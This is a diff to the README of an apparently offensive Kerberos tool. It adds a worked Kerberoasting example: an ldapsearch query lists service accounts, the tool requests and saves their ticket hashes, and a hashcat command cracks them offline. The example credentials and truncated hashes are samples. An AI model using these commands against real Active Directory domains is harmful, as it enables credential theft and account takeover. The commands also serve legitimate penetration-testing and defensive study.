@@ -195,7 +195,7 @@ cake.com/peter:HTTP/peter-pc
 
 By using that file you could obtain a result like the following:
 ```shell
-$ cerbero kerberoast u contoso.local/jaime -p Jama1234! -s /tmp/users.txt
+$ cerbero kerberoast u contoso.local/jaime -p Jama1234! -s /tmp/users.txt | tee /tmp/hashes.txt
 $krb5tgs$23$*sara$CONTOSO.LOCAL$sara@contoso.local*$637b06b244ad69bf30d9b0a956c6143....5f69271
 $krb5tgs$23$*jack$CONTOSO.LOCAL$HTTP/webserver*$8723987493798178273879856c6....ab78677
 $krb5tgs$23$*john$CAKE.COM$john@CAKE.COM*$87687619876bde9879879879....1111111
@@ -204,9 +204,15 @@ $krb5tgs$23$*peter$CAKE.COM$HTTP/peter-pc*$2c77d95792f1393d3f25aec157823....4f60
 
 To get a list of users with services you can use `ldapsearch`:
 ```shell
-ldapsearch -h 192.168.100.2 -b "dc=contoso,dc=local" -w Vader1234!  -D "Anakin@contoso.local" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" samaccountname | grep -i samaccountname: | cut -d ' ' -f 2 | tee users.txt
+$ ldapsearch -h 192.168.100.2 -b "dc=contoso,dc=local" -w Vader1234!  -D "Anakin@contoso.local" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" samaccountname | grep -i samaccountname: | cut -d ' ' -f 2 | tee users.txt
+anakin
+leia
 ```
 
+The tickets could be cracked by using the following [hashcat](https://hashcat.net/) command:
+```shell
+$ hashcat -m 13100 /tmp/hashes.txt wordlist.txt
+```
 ### List
 `list` shows the tickets information of a credentials file. Similar
 to `klist` command.
